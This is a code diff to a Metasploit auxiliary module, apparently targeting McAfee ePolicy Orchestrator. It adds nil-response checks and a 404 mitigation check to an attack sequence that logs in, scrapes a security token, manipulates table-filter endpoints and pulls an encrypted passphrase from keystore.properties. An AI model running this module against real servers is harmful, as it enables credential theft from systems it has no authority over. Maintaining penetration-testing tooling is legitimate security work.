@@ -69,6 +69,10 @@ class Metasploit3 < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path, 'core', 'orionSplashScreen.do')
     })
 
+    unless res
+      fail_with(Failure::Unknown, "Server did not respond in an expected way")
+    end
+    
     cookie = res.get_cookies
 
     res = send_request_cgi({
@@ -81,12 +85,20 @@ class Metasploit3 < Msf::Auxiliary
       'cookie' => cookie
     })
 
+    unless res
+      fail_with(Failure::Unknown, "Server did not respond in an expected way")
+    end
+    
     cookie = res.get_cookies
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'core', 'orionSplashScreen.do'),
       'cookie' => cookie
     })
+    
+    unless res
+      fail_with(Failure::Unknown, "Server did not respond in an expected way")
+    end
 
     if res.code != 302
       fail_with(Failure::Unknown, 'Authentication failed')
@@ -103,6 +115,10 @@ class Metasploit3 < Msf::Auxiliary
       'cookie' => cookie
     })
 
+    unless res
+      fail_with(Failure::Unknown, "Server did not respond in an expected way")
+    end
+    
     auth_token = $1 if res.body =~ /id="orion.user.security.token" value="(.*)"\/>/
 
     res = send_request_cgi({
@@ -114,6 +130,10 @@ class Metasploit3 < Msf::Auxiliary
       },
       'cookie' => cookie
     })
+
+    unless res
+      fail_with(Failure::Unknown, "Server did not respond in an expected way")
+    end
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'core', 'loadTableData.do'),
@@ -130,6 +150,10 @@ class Metasploit3 < Msf::Auxiliary
       'cookie' => cookie
     })
 
+    unless res
+      fail_with(Failure::Unknown, "Server did not respond in an expected way")
+    end
+
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'core', 'orionEditTableFilter.do'),
       'vars_get' => {
@@ -139,6 +163,10 @@ class Metasploit3 < Msf::Auxiliary
       },
       'cookie' => cookie
     })
+
+    unless res
+      fail_with(Failure::Unknown, "Server did not respond in an expected way")
+    end
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'core', 'orionTableUpdateState.do'),
@@ -156,6 +184,10 @@ class Metasploit3 < Msf::Auxiliary
       },
       'cookie' => cookie
     })
+
+    unless res
+      fail_with(Failure::Unknown, "Server did not respond in an expected way")
+    end
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'core', 'loadDisplayType.do'),
@@ -190,6 +222,14 @@ class Metasploit3 < Msf::Auxiliary
       'cookie' => cookie
     })
 
+    unless res
+      fail_with(Failure::Unknown, "Server did not respond in an expected way")
+    end
+
+    if res.code == 404
+      fail_with(Failure::Unknown, "Server likely has mitigation in place")
+    end
+    
     print_status("Getting encrypted passphrase value from keystore.properties file...")
 
     res = send_request_cgi({
@@ -201,6 +241,10 @@ class Metasploit3 < Msf::Auxiliary
       },
       'cookie' => cookie
     })
+
+    unless res
+      fail_with(Failure::Unknown, "Server did not respond in an expected way")
+    end
 
     passphrase = $1 if res.body =~ /passphrase=(.*?)\\u003/
 
